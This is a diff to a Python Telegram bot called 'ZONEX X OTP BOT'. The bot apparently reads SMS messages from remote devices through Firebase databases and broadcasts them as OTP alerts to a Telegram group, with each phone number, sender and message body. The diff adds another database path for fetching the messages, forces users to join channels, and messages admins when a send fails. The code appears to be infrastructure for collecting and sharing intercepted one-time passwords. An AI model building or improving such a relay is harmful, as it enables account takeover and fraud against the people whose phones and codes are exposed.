@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v6.6              ║
-║  High Level UI · 3 Force-Join · Alerts   ║
+║        ZONEX X OTP BOT v8.0              ║
+║  Ultimate Fix: UI · Groups · Auto-Alert  ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -32,7 +32,15 @@ BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
 AUTO_REFRESH   = 10
 
-# Tumhara Group ID yahan direct set kar diya hai
+# 3 Force-Join Jagah (2 Channel + 1 Group)
+CHANNELS = ["zonexarmy", "SMARTEARNERS011", "ZonexotpGroup"]   
+CH_NAMES = {
+    "zonexarmy": "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
+    "SMARTEARNERS011": "⚔️ SMART EARNERS",
+    "ZonexotpGroup": "💬 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏 𝐆𝐑𝐎𝐔𝐏",
+}
+
+# Group ID (Direct ID se message jayega)
 OTP_ALERT_GROUP_ID = -1004463422895  
 
 # ─── Firebase Configuration ──────────────────────────────────────────────────
@@ -54,15 +62,6 @@ FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
 DEVICES_PER_PAGE = 6
 WELCOME_HOURS  = 1
 
-# Yahan 3 jagah add kar di hain (2 Channel + 1 Group)
-CHANNELS = ["zonexarmy", "SMARTEARNERS011", "ZonexotpGroup"]   
-CH_NAMES = {
-    "zonexarmy": "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
-    "SMARTEARNERS011": "⚔️ SMART EARNERS",
-    "ZonexotpGroup": "💬 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏 𝐆𝐑𝐎𝐔𝐏",
-}
-
-# ─── Conversation states ──────────────────────────────────────────────────────
 WAIT_KEY        = 10
 WAIT_FB_URL     = 20
 WAIT_FB_LABEL   = 21
@@ -75,15 +74,12 @@ logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                     level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
 logger = logging.getLogger(__name__)
 
-# ─── Refresh lock ────────────────────────────────────────────────────────────
 _refresh_lock: asyncio.Lock = None
-sent_otps_cache = set() # Duplicate OTPs rokne ke liye
+sent_otps_cache = set()
 
-# ─── Key generator ────────────────────────────────────────────────────────────
 def _gen_key_raw(length=10) -> str:
     return "ZONEX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-# ─── Persistent Storage ───────────────────────────────────────────────────────
 def _default_data() -> dict:
     return {
         "users": {},
@@ -188,7 +184,6 @@ data = load_data()
 async def _sync_from_firebase_on_startup():
     await _load_firestore()
 
-# ─── Helper functions ─────────────────────────────────────────────────────────
 def get_referral_hours() -> float:
     return float(data.get("referral_hours", 1))
 
@@ -369,8 +364,11 @@ async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
 
 async def fetch_otps(url: str, key: str, dev_id: str):
     raw = await fb_get(url, f"messages/{dev_id}", key)
-    if raw is None:
+    if raw is None or not isinstance(raw, dict):
         raw = await fb_get(url, f"clients/{dev_id}/messages", key)
+    if raw is None or not isinstance(raw, dict):
+        raw = await fb_get(url, f"devices/{dev_id}/messages", key)
+        
     if not isinstance(raw, dict): return [], None
 
     otps: list  = []
@@ -521,6 +519,9 @@ async def refresh_clients_only(cfg: dict):
 # ─── Text Builders ────────────────────────────────────────────────────────────
 def txt_new_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
     phone = info.get('phone') or "—"
+    date_val = e['time'].split()[0] if ' ' in e['time'] else e['time']
+    time_val = e['time'].split()[1] if ' ' in e['time'] else ''
+    
     return (
         f"╔══════════════════════════╗\n"
         f"⚡ <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n"
@@ -529,8 +530,8 @@ def txt_new_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"📱 <b>𝐌𝐎𝐁𝐈𝐋𝐄 :</b> {phone}\n"
         f"📩 <b>𝐒𝐄𝐍𝐃𝐄𝐑 :</b> {e['sender']}\n"
-        f"📅 <b>𝐃𝐀𝐓𝐄 :</b> {e['time'].split()[0] if ' ' in e['time'] else e['time']}\n"
-        f"⏰ <b>𝐓𝐈𝐌𝐄 :</b> {e['time'].split()[1] if ' ' in e['time'] else ''}\n\n"
+        f"📅 <b>𝐃𝐀𝐓𝐄 :</b> {date_val}\n"
+        f"⏰ <b>𝐓𝐈𝐌𝐄 :</b> {time_val}\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</b>\n\n"
         f"{e['msg']}\n\n"
@@ -598,14 +599,9 @@ def count_otps() -> int:
 
 def all_online() -> list:
     res = []
-    seen_phones = set()
     for lb, dm in device_cache.items():
         for did, info in dm.items():
             if info.get("online"):
-                ph = info.get("phone", "—")
-                if ph != "—" and ph in seen_phones:
-                    continue
-                seen_phones.add(ph)
                 res.append((lb, did, info))
     return res
 
@@ -2504,6 +2500,18 @@ async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
                                 )
                             except Exception as ex:
                                 logger.warning(f"Group OTP send fail: {ex}")
+                                # Send error to admin in DM
+                                for admin_id in ADMIN_IDS:
+                                    try:
+                                        await ctx.bot.send_message(
+                                            admin_id,
+                                            f"⚠️ <b>Group OTP Send Failed</b>\n\n"
+                                            f"Group ID: <code>{OTP_ALERT_GROUP_ID}</code>\n"
+                                            f"Error: <code>{str(ex)[:100]}</code>\n\n"
+                                            f"<i>Check if bot is Admin in the group and Anti-Spam is OFF.</i>",
+                                            parse_mode="HTML"
+                                        )
+                                    except: pass
 
 # ─── Main ─────────────────────────────────────────────────────────────────────
 async def _on_startup(app):
@@ -2514,7 +2522,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v6.6 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v8.0 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
